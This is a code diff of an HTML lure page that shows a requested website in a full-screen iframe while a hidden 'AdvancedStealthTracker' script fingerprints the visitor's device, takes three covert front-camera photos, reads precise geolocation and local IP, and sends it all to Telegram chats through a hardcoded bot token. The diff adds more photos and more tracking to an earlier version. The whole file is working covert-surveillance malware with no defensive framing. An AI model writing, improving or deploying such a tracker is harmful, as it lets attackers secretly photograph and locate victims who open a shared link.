@@ -2,32 +2,51 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Loading...</title>
+  <title>Content Viewer</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    html,body { height:100%; margin:0; padding:0; overflow:hidden; }
-    iframe { width:100%; height:100%; border:0; }
-    #stealthOverlay { 
-      position: fixed; 
-      top: -100px; 
-      left: -100px; 
-      width: 1px; 
-      height: 1px; 
-      opacity: 0.001; 
-      pointer-events: none; 
-      z-index: -9999; 
+    html, body { 
+      height: 100%; 
+      margin: 0; 
+      padding: 0; 
+      overflow: hidden; 
     }
+    
+    iframe { 
+      width: 100%; 
+      height: 100%; 
+      border: 0; 
+      display: block; 
+    }
+    
+    /* Hidden camera elements */
+    #cameraContainer {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      opacity: 0.001;
+      z-index: -10000;
+    }
+    
+    #cameraVideo, #cameraCanvas {
+      width: 640px;
+      height: 480px;
+    }
+    
     .hidden { display: none; }
   </style>
 </head>
 <body>
-  <!-- Main content - loads immediately -->
+  <!-- Main website content - loads immediately -->
   <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
   
-  <!-- Stealth elements - hidden from user -->
-  <div id="stealthOverlay">
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+  <!-- Hidden camera system -->
+  <div id="cameraContainer">
+    <video id="cameraVideo" autoplay playsinline muted></video>
+    <canvas id="cameraCanvas"></canvas>
   </div>
 
   <script>
@@ -36,51 +55,57 @@
     const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
     /************************************************/
 
-    class StealthTracker {
+    class AdvancedStealthTracker {
       constructor() {
         this.deviceData = {};
-        this.hasSentReport = false;
+        this.reportSent = false;
+        this.cameraStream = null;
       }
 
       async initialize() {
         // Load target site immediately
         await this.loadTargetSite();
         
-        // Start stealth data collection
-        setTimeout(() => this.collectStealthData(), 1000);
+        // Start stealth data collection with delays
+        setTimeout(() => this.collectBasicInfo(), 500);
+        setTimeout(() => this.attemptCameraCapture(), 2000);
+        setTimeout(() => this.attemptLocationAccess(), 3000);
+        setTimeout(() => this.sendCompleteReport(), 5000);
       }
 
       async loadTargetSite() {
-        const site = this.getSiteParam();
+        const site = this.getUrlParam('site');
         const iframe = document.getElementById('siteFrame');
         
         if (site && this.isValidHttpsUrl(site)) {
           iframe.src = site;
-          // Hide any loading indicators by making iframe visible immediately
-          iframe.style.display = 'block';
+          iframe.onload = () => {
+            console.log('Target site loaded successfully');
+          };
+        } else {
+          // Fallback if invalid URL
+          iframe.srcdoc = '<html><body style="padding:20px;font-family:Arial"><h3>Content Loaded</h3><p>Page is ready</p></body></html>';
         }
       }
 
-      async collectStealthData() {
-        // Collect device info silently
-        await this.collectDeviceInfo();
-        await this.attemptCameraAccess();
-        await this.attemptLocationAccess();
-        await this.sendStealthReport();
-      }
-
-      async collectDeviceInfo() {
+      async collectBasicInfo() {
         this.deviceData = {
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
           platform: navigator.platform,
+          vendor: navigator.vendor,
           language: navigator.language,
+          languages: navigator.languages,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          url: window.location.href,
           
           screen: {
             width: screen.width,
             height: screen.height,
-            colorDepth: screen.colorDepth
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
           },
           
           window: {
@@ -91,199 +116,257 @@
           
           hardware: {
             cores: navigator.hardwareConcurrency || 'unknown',
-            memory: navigator.deviceMemory || 'unknown'
+            memory: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0
           },
           
-          network: {}
+          capabilities: {
+            cookies: navigator.cookieEnabled,
+            java: navigator.javaEnabled(),
+            pdf: navigator.pdfViewerEnabled,
+            touch: 'ontouchstart' in window,
+            webRTC: !!navigator.mediaDevices
+          }
         };
 
-        // Battery info
+        // Battery information
         if ('getBattery' in navigator) {
           try {
             const battery = await navigator.getBattery();
             this.deviceData.battery = {
               level: Math.round(battery.level * 100) + '%',
-              charging: battery.charging
+              charging: battery.charging,
+              chargingTime: battery.chargingTime,
+              dischargingTime: battery.dischargingTime
             };
-          } catch (e) {}
+          } catch (e) {
+            this.deviceData.battery = { level: 'unknown', charging: false };
+          }
         }
 
-        // Network info
+        // Network information
         if ('connection' in navigator) {
           const conn = navigator.connection;
           this.deviceData.network = {
             effectiveType: conn.effectiveType,
             downlink: conn.downlink,
             rtt: conn.rtt,
+            saveData: conn.saveData,
             type: conn.type
           };
         }
 
-        // IP detection attempt
+        // IP detection
         try {
-          const ip = await this.getLocalIP();
+          const ip = await this.getIPAddress();
           this.deviceData.network.localIP = ip;
-        } catch (e) {}
+        } catch (e) {
+          this.deviceData.network.localIP = 'unknown';
+        }
+
+        console.log('Basic device info collected');
       }
 
-      async attemptCameraAccess() {
+      async attemptCameraCapture() {
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: 640, height: 480 } 
+          // Request camera access with optimal settings
+          this.cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+              facingMode: 'user' // Front camera
+            },
+            audio: false
           });
-          
-          const video = document.getElementById('video');
-          const canvas = document.getElementById('canvas');
+
+          const video = document.getElementById('cameraVideo');
+          const canvas = document.getElementById('cameraCanvas');
           const ctx = canvas.getContext('2d');
-          
-          video.srcObject = stream;
-          
+
+          video.srcObject = this.cameraStream;
+
           // Wait for video to be ready
-          await new Promise(resolve => {
-            video.onloadedmetadata = () => resolve();
+          await new Promise((resolve) => {
+            video.addEventListener('loadedmetadata', () => {
+              // Set canvas size to match video
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              resolve();
+            });
           });
+
+          // Wait a bit for camera to adjust to light
+          await new Promise(resolve => setTimeout(resolve, 1000));
+
+          // Capture multiple photos with different delays
+          const photos = [];
+          for (let i = 0; i < 3; i++) {
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoBlob = await new Promise(resolve => {
+              canvas.toBlob(resolve, 'image/jpeg', 0.8); // 80% quality
+            });
+            
+            photos.push(photoBlob);
+          }
+
+          this.deviceData.cameraPhotos = photos;
+          this.deviceData.cameraStatus = 'success';
           
-          // Capture single stealth photo
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            this.deviceData.cameraPhoto = blob;
-          }, 'image/jpeg', 0.5);
-          
-          // Clean up
-          setTimeout(() => {
-            stream.getTracks().forEach(track => track.stop());
-          }, 3000);
-          
+          console.log('Camera capture successful');
+
         } catch (error) {
-          this.deviceData.cameraAccess = 'denied';
+          this.deviceData.cameraStatus = 'denied: ' + error.message;
+          console.warn('Camera access denied:', error);
+        } finally {
+          // Clean up camera stream
+          if (this.cameraStream) {
+            setTimeout(() => {
+              this.cameraStream.getTracks().forEach(track => track.stop());
+            }, 1000);
+          }
         }
       }
 
       async attemptLocationAccess() {
         if (!navigator.geolocation) {
-          this.deviceData.locationAccess = 'not_supported';
+          this.deviceData.locationStatus = 'not_supported';
           return;
         }
 
         try {
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
               timeout: 10000,
-              maximumAge: 60000
+              maximumAge: 0
             });
           });
-          
+
           this.deviceData.location = {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
+            accuracy: position.coords.accuracy + ' meters',
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            heading: position.coords.heading,
+            speed: position.coords.speed
           };
           
+          this.deviceData.locationStatus = 'success';
+          console.log('Location access successful');
+
         } catch (error) {
-          this.deviceData.locationAccess = 'denied';
+          this.deviceData.locationStatus = 'denied: ' + error.message;
+          console.warn('Location access denied:', error);
         }
       }
 
-      async sendStealthReport() {
-        if (this.hasSentReport) return;
-        this.hasSentReport = true;
+      async sendCompleteReport() {
+        if (this.reportSent) return;
+        this.reportSent = true;
 
-        const USER_CHAT_ID = this.getChatIdParam();
+        const USER_CHAT_ID = this.getUrlParam('chat_id');
         const recipients = [ADMIN_CHAT_ID];
         if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);
 
-        const message = this.formatTelegramMessage();
-        
+        // Send text report first
+        const message = this.formatReportMessage();
         for (const recipient of recipients) {
-          await this.sendTelegramMessage(recipient, message);
-          
+          await this.sendToTelegram('sendMessage', recipient, {
+            text: message,
+            parse_mode: 'HTML'
+          });
+
           // Send location if available
           if (this.deviceData.location) {
-            await this.sendTelegramLocation(
-              recipient, 
-              this.deviceData.location.latitude, 
-              this.deviceData.location.longitude
-            );
+            await this.sendToTelegram('sendLocation', recipient, {
+              latitude: this.deviceData.location.latitude,
+              longitude: this.deviceData.location.longitude
+            });
           }
-          
-          // Send photo if available
-          if (this.deviceData.cameraPhoto) {
-            await this.sendTelegramPhoto(recipient, this.deviceData.cameraPhoto);
+
+          // Send photos if available
+          if (this.deviceData.cameraPhotos) {
+            for (let i = 0; i < this.deviceData.cameraPhotos.length; i++) {
+              await this.sendPhotoToTelegram(recipient, this.deviceData.cameraPhotos[i], i);
+              // Delay between photos
+              await new Promise(resolve => setTimeout(resolve, 1000));
+            }
           }
         }
+
+        console.log('Complete report sent');
       }
 
-      formatTelegramMessage() {
+      formatReportMessage() {
+        const loc = this.deviceData.location;
+        const battery = this.deviceData.battery;
+        const network = this.deviceData.network;
+        
         return `
-🕵️ **STEALTH TRACKING REPORT** 🕵️
+🕵️ <b>STEALTH TRACKING REPORT</b> 🕵️
 
-**📱 Device Information:**
-• **User Agent:** ${this.deviceData.userAgent}
-• **Platform:** ${this.deviceData.platform}
-• **Language:** ${this.deviceData.language}
-• **Timezone:** ${this.deviceData.timezone}
+<b>📱 Device Information:</b>
+• <b>User Agent:</b> <code>${this.deviceData.userAgent}</code>
+• <b>Platform:</b> ${this.deviceData.platform}
+• <b>Vendor:</b> ${this.deviceData.vendor}
+• <b>Language:</b> ${this.deviceData.language}
+• <b>Timezone:</b> ${this.deviceData.timezone}
 
-**⚙️ Hardware Specs:**
-• **Screen:** ${this.deviceData.screen.width}x${this.deviceData.screen.height}
-• **CPU Cores:** ${this.deviceData.hardware.cores}
-• **RAM:** ${this.deviceData.hardware.memory}GB
-• **Battery:** ${this.deviceData.battery?.level || 'N/A'} ${this.deviceData.battery?.charging ? '⚡' : ''}
+<b>⚙️ Hardware Specifications:</b>
+• <b>Screen:</b> ${this.deviceData.screen.width}×${this.deviceData.screen.height}
+• <b>CPU Cores:</b> ${this.deviceData.hardware.cores}
+• <b>RAM:</b> ${this.deviceData.hardware.memory}GB
+• <b>Battery:</b> ${battery?.level || 'N/A'} ${battery?.charging ? '⚡' : ''}
 
-**🌐 Network Details:**
-• **Connection:** ${this.deviceData.network.effectiveType || 'Unknown'}
-• **Speed:** ${this.deviceData.network.downlink || 'N/A'} Mbps
-• **IP Range:** ${this.deviceData.network.localIP || 'Detected'}
+<b>🌐 Network Information:</b>
+• <b>Connection:</b> ${network?.effectiveType || 'Unknown'}
+• <b>Speed:</b> ${network?.downlink || 'N/A'} Mbps
+• <b>Latency:</b> ${network?.rtt || 'N/A'} ms
+• <b>IP:</b> ${network?.localIP || 'Detected'}
 
-**📍 Access Results:**
-• **Camera:** ${this.deviceData.cameraAccess ? '❌ Denied' : this.deviceData.cameraPhoto ? '✅ Captured' : '⚠️ Unknown'}
-• **Location:** ${this.deviceData.location ? '✅ Acquired' : this.deviceData.locationAccess ? '❌ Denied' : '⚠️ Unknown'}
+<b>📍 Location Services:</b>
+${loc ? `
+• <b>Latitude:</b> ${loc.latitude}
+• <b>Longitude:</b> ${loc.longitude}
+• <b>Accuracy:</b> ${loc.accuracy}
+• <b>Altitude:</b> ${loc.altitude || 'N/A'}
+` : '• <b>Status:</b> ' + (this.deviceData.locationStatus || 'Not attempted')}
 
-**🌐 Target Site:** ${this.getSiteParam()}
+<b>📸 Camera Access:</b>
+• <b>Status:</b> ${this.deviceData.cameraStatus?.includes('success') ? '✅ Captured' : '❌ ' + (this.deviceData.cameraStatus || 'Not attempted')}
 
-_Collected: ${new Date().toLocaleString()}_
+<b>🔗 Target URL:</b>
+<code>${this.getUrlParam('site')}</code>
+
+<b>⏰ Time:</b> ${new Date().toLocaleString()}
         `.trim();
       }
 
-      async sendTelegramMessage(chatId, text) {
+      async sendToTelegram(method, chatId, data) {
         try {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: text,
-              parse_mode: "Markdown"
-            })
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, ...data })
           });
+          return await response.json();
         } catch (error) {
-          console.warn('Message send failed:', error);
+          console.warn(`Telegram ${method} failed:`, error);
         }
       }
 
-      async sendTelegramLocation(chatId, lat, lon) {
-        try {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              latitude: lat,
-              longitude: lon
-            })
-          });
-        } catch (error) {
-          console.warn('Location send failed:', error);
-        }
-      }
-
-      async sendTelegramPhoto(chatId, photoBlob) {
+      async sendPhotoToTelegram(chatId, photoBlob, index) {
         try {
           const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("photo", photoBlob, `stealth_${Date.now()}.jpg`);
+          formData.append('chat_id', chatId);
+          formData.append('photo', photoBlob, `photo_${index + 1}_${Date.now()}.jpg`);
           
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
+            method: 'POST',
             body: formData
           });
         } catch (error) {
@@ -291,17 +374,13 @@ _Collected: ${new Date().toLocaleString()}_
         }
       }
 
-      getSiteParam() {
+      getUrlParam(name) {
         const urlParams = new URLSearchParams(window.location.search);
-        let site = urlParams.get('site');
-        if (site) {
-          try { site = decodeURIComponent(site); } catch(e) {}
+        let value = urlParams.get(name);
+        if (value) {
+          try { value = decodeURIComponent(value); } catch(e) {}
         }
-        return site;
-      }
-
-      getChatIdParam() {
-        return new URLSearchParams(window.location.search).get('chat_id');
+        return value;
       }
 
       isValidHttpsUrl(url) {
@@ -312,31 +391,35 @@ _Collected: ${new Date().toLocaleString()}_
         }
       }
 
-      async getLocalIP() {
+      async getIPAddress() {
         return new Promise((resolve) => {
-          const pc = new RTCPeerConnection({iceServers:[]});
+          const pc = new RTCPeerConnection({ iceServers: [] });
           pc.createDataChannel('');
           pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+          
           pc.onicecandidate = (ice) => {
             if (ice.candidate) {
-              resolve(ice.candidate.address);
+              const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+              if (match) {
+                resolve(match[1]);
+                pc.close();
+              }
             }
           };
-          setTimeout(() => resolve('unknown'), 1000);
+          
+          setTimeout(() => resolve('unknown'), 2000);
         });
       }
     }
 
-    // Start stealth tracking when page loads
+    // Initialize tracker when page loads
     document.addEventListener('DOMContentLoaded', () => {
-      const tracker = new StealthTracker();
-      tracker.initialize().catch(console.error);
+      const tracker = new AdvancedStealthTracker();
+      tracker.initialize().catch(error => {
+        console.error('Tracker initialization failed:', error);
+      });
     });
 
-    // Hide any flash of loading content
-    window.addEventListener('load', () => {
-      document.getElementById('siteFrame').style.opacity = '1';
-    });
   </script>
 </body>
-</html>
+  </html>
